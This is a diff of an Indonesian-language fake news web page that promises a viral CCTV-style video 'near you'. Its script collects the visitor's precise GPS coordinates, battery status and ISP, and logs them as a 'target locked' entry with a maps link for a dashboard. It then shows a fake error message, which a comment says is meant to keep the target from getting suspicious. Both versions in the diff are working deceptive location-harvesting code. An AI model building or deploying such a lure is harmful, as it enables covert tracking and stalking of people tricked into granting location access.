@@ -3,58 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - BERITA VIRAL HARI INI</title>
+    <title>BREAKING NEWS: Kejadian Viral Hari Ini!</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; }
-        .nav { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; }
-        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .video-thumb { width: 100%; height: 250px; background: #000 url('https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg') no-repeat center; background-size: cover; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; }
-        .play-btn { background: rgba(211, 47, 47, 0.9); color: white; padding: 15px 25px; border-radius: 50px; font-weight: bold; font-size: 18px; border: 3px solid white; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        h2 { font-size: 18px; color: #111; margin: 15px 0; line-height: 1.4; }
-        .btn-nonton { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
-        .footer { text-align: center; font-size: 10px; color: #888; margin-top: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; color: #333; }
+        .header { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
+        .content { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .thumb { width: 100%; height: 200px; background: #ddd; border-radius: 10px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #888; border: 2px dashed #bbb; }
+        h2 { font-size: 20px; margin-top: 0; color: #111; }
+        p { font-size: 14px; line-height: 1.6; color: #555; }
+        .btn-watch { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 8px; margin-top: 10px; box-shadow: 0 4px 0 #b71c1c; }
+        .btn-watch:active { transform: translateY(2px); box-shadow: 0 2px 0 #b71c1c; }
+        .footer { text-align: center; font-size: 11px; color: #999; margin-top: 30px; }
     </style>
 </head>
 <body>
 
-<div class="nav">🔴 GNN NEWS LIVE</div>
+<div class="header">GNN - GLOBAL NEWS NETWORK</div>
 
-<div class="container">
-    <div class="video-thumb" onclick="gasLacak()">
-        <div class="play-btn">▶ TONTON SEKARANG</div>
-    </div>
-    <h2>VIRAL: Rekaman Tak Terduga CCTV di Dekat Lokasi Anda Tersebar Luas!</h2>
-    <p style="font-size: 13px; color: #555;">Pihak berwajib meminta warga untuk tetap waspada. Klik tombol di bawah untuk melihat detail kejadian dan lokasi tepatnya.</p>
+<div class="content">
+    <div class="thumb">MEMUAT VIDEO...</div>
+    <h2>🔴 LIVE: Peristiwa Tak Terduga Terekam Kamera di Dekat Anda!</h2>
+    <p>
+        Sebuah kejadian mengejutkan baru saja dilaporkan oleh warga setempat. Pihak kepolisian sudah berada di lokasi untuk melakukan evakuasi.
+        <br><br>
+        Klik tombol di bawah dan <b>Izinkan Akses</b> untuk menyesuaikan berita dengan wilayah Anda dan menonton video lengkapnya.
+    </p>
     
-    <button class="btn-nonton" onclick="gasLacak()">KONFIRMASI LOKASI & TONTON</button>
+    <button class="btn-watch" id="mainBtn" onclick="mulaiPancingan()">TONTON VIDEO SEKARANG</button>
 </div>
 
-<div class="footer">Dikelola oleh GNN Media Network • 2026</div>
+<div class="footer">© 2026 GNN Media Group. Seluruh Hak Cipta Dilindungi.</div>
 
 <script>
-    async function gasLacak() {
-        const btn = document.querySelector('.btn-nonton');
-        btn.innerText = "MENGHUBUNGKAN SATELIT...";
-        
-        let batInfo = "N/A";
-        let ispInfo = "Mencari ISP...";
+    async function mulaiPancingan() {
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "MENGHUBUNGKAN KE SERVER...";
+        btn.disabled = true;
 
-        // 1. AMBIL DATA BATERAI
+        let bateraiInfo = "Tidak Diketahui";
+        let providerInfo = "Mencari Provider...";
+
+        // 1. CEK BATERAI (SENSITIF)
         try {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Sisa)");
+                bateraiInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Sedang Dicas ⚡)" : "(Tidak Dicas)");
             }
-        } catch(e) {}
+        } catch (e) { bateraiInfo = "Gagal Ambil Data"; }
 
-        // 2. AMBIL DATA PROVIDER (ISP)
+        // 2. CEK PROVIDER/ISP (VIA IP API)
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            ispInfo = data.org || "Provider Privat";
-        } catch(e) { ispInfo = "Provider Terenkripsi"; }
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            providerInfo = data.org || "Provider Tidak Terdeteksi";
+        } catch (e) { providerInfo = "Koneksi Provider Terenkripsi"; }
 
-        // 3. AMBIL KOORDINAT GPS
+        // 3. CEK LOKASI GPS (INTI)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -62,35 +66,38 @@
                     const lon = pos.coords.longitude;
                     const jam = new Date().toLocaleTimeString();
                     
-                    // Format Log untuk Dashboard v17 (Sesuai Tab Radar)
-                    const formatLog = `
-                        <div style="padding:5px;">
-                            <b style="color:#d32f2f;">📍 TARGET KENA JIRZ! [${jam}]</b><br>
-                            🔋 <b>Baterai:</b> ${batInfo}<br>
-                            📶 <b>Provider:</b> ${ispInfo}<br>
-                            🌍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:blue; font-weight:bold;">BUKA MAPS (PRESISI)</a>
+                    // AMBIL LOGS LAMA
+                    let logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
+                    
+                    // FORMAT DATA BUAT MASUK KE MARKAS KALZ
+                    const hasilIntel = `
+                        <div style="border-bottom:1px solid #eee; padding-bottom:5px;">
+                            <b>🕒 [${jam}] TARGET TERKUNCI!</b><br>
+                            🔋 <b>Baterai:</b> ${bateraiInfo}<br>
+                            📶 <b>Provider:</b> ${providerInfo}<br>
+                            📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#d32f2f; font-weight:bold;">[ BUKA GOOGLE MAPS ]</a>
                         </div>
                     `;
+                    
+                    logs.unshift(hasilIntel);
+                    localStorage.setItem("eye_logs", JSON.stringify(logs));
 
-                    // Simpan ke LocalStorage yang dibaca Dashboard
-                    let oldLogs = JSON.parse(localStorage.getItem("eye_logs")) || [];
-                    oldLogs.unshift(formatLog);
-                    localStorage.setItem("eye_logs", JSON.stringify(oldLogs));
-
-                    // Fake Error biar target ga curiga
+                    // FAKE ERROR BIAR TARGET GA CURIGA
                     setTimeout(() => {
-                        alert("Koneksi Error 403: Video ini telah dihapus atau dibatasi di wilayah Anda karena mengandung unsur kekerasan.");
-                        btn.innerText = "TONTON SEKARANG";
-                    }, 1500);
+                        alert("Error 505: Server Sibuk! Video gagal dimuat karena terlalu banyak yang menonton di wilayah Anda. Coba beberapa saat lagi.");
+                        btn.innerText = "TONTON VIDEO SEKARANG";
+                        btn.disabled = false;
+                    }, 2000);
                 },
                 (err) => {
-                    alert("Akses Ditolak! Anda harus mengizinkan lokasi untuk memverifikasi bahwa Anda bukan robot/bot.");
-                    btn.innerText = "TONTON SEKARANG";
+                    alert("AKSES DITOLAK: Anda harus mengizinkan akses lokasi untuk melihat berita viral di sekitar Anda.");
+                    btn.innerText = "TONTON VIDEO SEKARANG";
+                    btn.disabled = false;
                 },
                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
         } else {
-            alert("Browser Anda terlalu jadul buat nonton video ini.");
+            alert("Browser Anda tidak mendukung sistem satelit.");
         }
     }
 </script>
